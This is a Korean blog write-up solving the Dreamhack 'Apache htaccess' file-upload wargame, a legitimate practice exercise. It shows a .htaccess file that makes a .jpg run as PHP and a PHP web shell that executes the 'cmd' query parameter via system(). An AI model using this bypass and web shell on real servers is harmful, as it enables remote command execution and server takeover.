---
title: "드림핵 lv.1 - Apache htaccess"
date: 2025-03-10 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, file upload, apache, htaccess] 
description: 드림핵 Apache htaccess 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/418](https://dreamhack.io/wargame/challenges/418)
# 문제 설명
파일 업로드 기능을 악용하여 서버의 권한을 획득하세요 !

---
# 문제 풀이
## 코드 분석
```
[Code Structure]
src/
	- index.php
	- upload.php
000-default.conf
Dockerfile
run-lamp.sh
```
웹사이트에 접속하면 단순하게 파일을 업로드하는 기능만 있기 때문에 바로 코드를 살펴보기로 했다.
### upload.php
```php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
```
메인 페이지에서 파일을 업로드하면 해당 php 코드가 실행된다. <br />
업로드된 파일은 "upload/"라는 디렉토리에 저장되고 `"/upload/" + filename` 형식으로 웹 접근이 가능하다.
### Dockerfile
```
# FLAG
COPY ./flag.c /flag.c
RUN apt install -y gcc \
    && gcc /flag.c -o /flag \
    && chmod 111 /flag && rm /flag.c
```
`Dockerfile`에 플래그 파일의 위치가 나와있다. "/flag"이다.
## 최종 분석
### 취약점 분석
`upload.php`를 보면 업로드된 파일을 url로 접근하는 것이 가능하다. <br /> 
심지어 업로드 할 때에 확장자 체크 말고는 별달리 파일의 안전성을 확인하는 부분이 없기에, 이 부분에서 File Upload 취약점이 발생한다.<br />
### 파일 확장자 필터링 우회
Apache 서버에서는 보통 `.htaccess`라는 설정 파일로 각 디렉토리마다 다른 설정을 가질 수 있게 하는 기능이 있다.<br />

이를 이용하면 .php가 아닌 확장자도 php 파일처럼 해석되게끔 설정해줄 수 있다.<br />
#### .htaccess 파일 작성
```
<Files "webshell.jpg">
    SetHandler application/x-httpd-php
</Files>
```
이렇게 작성하여 업로드 해주면 해당 파일은 "/upload/.htaccess" 경로로 저장된다. <br />
그러면 이제 "upload/" 디렉토리는 ₩에 명시된 설정 값이 적용된다.<br />
### 웹쉘 업로드하기
```php
<?php
	echo "Webshell is working!";
	system($_GET["cmd"]);
?>
```
이렇게 작성된 "webshell.jpg" 파일을 하나 만들어서 업로드해주면 된다. <br />
일반 텍스트 에디터(VSCode 라던가)로는 jpg 파일에 코드를 작성하는 것이 어려워서 본인은 터미널의 vim을 이용했다.
### 플래그 출력하기
"/upload/webshell.jpg"에 접속하면 "Webshell is working!"이라는 문구가 잘 뜨는 것을 보니 `.htaccess` 설정 값이 제대로 작동하고 있는 모양이다.<br />

이제 `cmd`값에 `Dockerfile`에서 알아냈던 "/flag" 파일을 실행시키면 플래그가 출력된다.
# 배운 것
드림핵 강의에서, `.htaccess`는 설정 파일을 분산시킬 수 있도록 아파치 서버에서 제공하는 기능이라고 했을 때 무슨 소리인가 잘 이해가 되지 않았는데 해당 문제를 풀어보면서 단번에 이해할 수 있었다.